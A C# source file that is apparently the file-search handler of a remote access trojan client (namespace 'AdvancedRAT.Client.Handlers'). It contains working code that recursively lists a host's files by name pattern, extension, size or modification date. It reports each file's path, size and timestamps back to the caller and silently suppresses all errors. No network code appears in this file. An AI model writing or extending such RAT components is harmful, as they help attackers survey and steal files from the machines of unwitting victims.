using System;
using System.Threading.Tasks;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace AdvancedRAT.Client.Handlers
{
    public class FileSearchHandler
    {
        private bool isSearching = false;
        private CancellationTokenSource cancellationToken;
        
        public async Task<object> SearchFiles(string searchPath, string pattern, bool includeSubdirectories = true)
        {
            try
            {
                if (isSearching)
                {
                    return new { success = false, message = "Search already in progress" };
                }
                
                isSearching = true;
                cancellationToken = new CancellationTokenSource();
                
                var results = new List<Dictionary<string, string>>();
                
                await Task.Run(() =>
                {
                    SearchDirectory(searchPath, pattern, includeSubdirectories, results, cancellationToken.Token);
                }, cancellationToken.Token);
                
                isSearching = false;
                
                return new
                {
                    success = true,
                    results,
                    count = results.Count
                };
            }
            catch (Exception ex)
            {
                isSearching = false;
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> SearchByExtension(string searchPath, string extension, bool includeSubdirectories = true)
        {
            try
            {
                string pattern = $"*.{extension.TrimStart('.')}";
                return await SearchFiles(searchPath, pattern, includeSubdirectories);
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> SearchBySize(string searchPath, long minSize, long maxSize, bool includeSubdirectories = true)
        {
            try
            {
                if (isSearching)
                {
                    return new { success = false, message = "Search already in progress" };
                }
                
                isSearching = true;
                cancellationToken = new CancellationTokenSource();
                
                var results = new List<Dictionary<string, string>>();
                
                await Task.Run(() =>
                {
                    SearchDirectoryBySize(searchPath, minSize, maxSize, includeSubdirectories, results, cancellationToken.Token);
                }, cancellationToken.Token);
                
                isSearching = false;
                
                return new
                {
                    success = true,
                    results,
                    count = results.Count
                };
            }
            catch (Exception ex)
            {
                isSearching = false;
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> SearchByDate(string searchPath, DateTime fromDate, DateTime toDate, bool includeSubdirectories = true)
        {
            try
            {
                if (isSearching)
                {
                    return new { success = false, message = "Search already in progress" };
                }
                
                isSearching = true;
                cancellationToken = new CancellationTokenSource();
                
                var results = new List<Dictionary<string, string>>();
                
                await Task.Run(() =>
                {
                    SearchDirectoryByDate(searchPath, fromDate, toDate, includeSubdirectories, results, cancellationToken.Token);
                }, cancellationToken.Token);
                
                isSearching = false;
                
                return new
                {
                    success = true,
                    results,
                    count = results.Count
                };
            }
            catch (Exception ex)
            {
                isSearching = false;
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> StopSearch()
        {
            try
            {
                if (isSearching && cancellationToken != null)
                {
                    cancellationToken.Cancel();
                    isSearching = false;
                    return new { success = true, message = "Search stopped" };
                }
                
                return new { success = false, message = "No search in progress" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private void SearchDirectory(string path, string pattern, bool includeSubdirectories, List<Dictionary<string, string>> results, CancellationToken token)
        {
            if (token.IsCancellationRequested) return;
            
            try
            {
                // Search files
                foreach (string file in Directory.GetFiles(path, pattern))
                {
                    if (token.IsCancellationRequested) return;
                    
                    try
                    {
                        FileInfo fi = new FileInfo(file);
                        results.Add(new Dictionary<string, string>
                        {
                            ["Path"] = file,
                            ["Name"] = fi.Name,
                            ["Size"] = fi.Length.ToString(),
                            ["Created"] = fi.CreationTime.ToString("yyyy-MM-dd HH:mm:ss"),
                            ["Modified"] = fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"),
                            ["Extension"] = fi.Extension
                        });
                    }
                    catch { }
                }
                
                // Search subdirectories
                if (includeSubdirectories)
                {
                    foreach (string dir in Directory.GetDirectories(path))
                    {
                        if (token.IsCancellationRequested) return;
                        SearchDirectory(dir, pattern, includeSubdirectories, results, token);
                    }
                }
            }
            catch { }
        }
        
        private void SearchDirectoryBySize(string path, long minSize, long maxSize, bool includeSubdirectories, List<Dictionary<string, string>> results, CancellationToken token)
        {
            if (token.IsCancellationRequested) return;
            
            try
            {
                foreach (string file in Directory.GetFiles(path))
                {
                    if (token.IsCancellationRequested) return;
                    
                    try
                    {
                        FileInfo fi = new FileInfo(file);
                        if (fi.Length >= minSize && fi.Length <= maxSize)
                        {
                            results.Add(new Dictionary<string, string>
                            {
                                ["Path"] = file,
                                ["Name"] = fi.Name,
                                ["Size"] = fi.Length.ToString(),
                                ["Created"] = fi.CreationTime.ToString("yyyy-MM-dd HH:mm:ss"),
                                ["Modified"] = fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"),
                                ["Extension"] = fi.Extension
                            });
                        }
                    }
                    catch { }
                }
                
                if (includeSubdirectories)
                {
                    foreach (string dir in Directory.GetDirectories(path))
                    {
                        if (token.IsCancellationRequested) return;
                        SearchDirectoryBySize(dir, minSize, maxSize, includeSubdirectories, results, token);
                    }
                }
            }
            catch { }
        }
        
        private void SearchDirectoryByDate(string path, DateTime fromDate, DateTime toDate, bool includeSubdirectories, List<Dictionary<string, string>> results, CancellationToken token)
        {
            if (token.IsCancellationRequested) return;
            
            try
            {
                foreach (string file in Directory.GetFiles(path))
                {
                    if (token.IsCancellationRequested) return;
                    
                    try
                    {
                        FileInfo fi = new FileInfo(file);
                        if (fi.LastWriteTime >= fromDate && fi.LastWriteTime <= toDate)
                        {
                            results.Add(new Dictionary<string, string>
                            {
                                ["Path"] = file,
                                ["Name"] = fi.Name,
                                ["Size"] = fi.Length.ToString(),
                                ["Created"] = fi.CreationTime.ToString("yyyy-MM-dd HH:mm:ss"),
                                ["Modified"] = fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"),
                                ["Extension"] = fi.Extension
                            });
                        }
                    }
                    catch { }
                }
                
                if (includeSubdirectories)
                {
                    foreach (string dir in Directory.GetDirectories(path))
                    {
                        if (token.IsCancellationRequested) return;
                        SearchDirectoryByDate(dir, fromDate, toDate, includeSubdirectories, results, token);
                    }
                }
            }
            catch { }
        }
    }
}
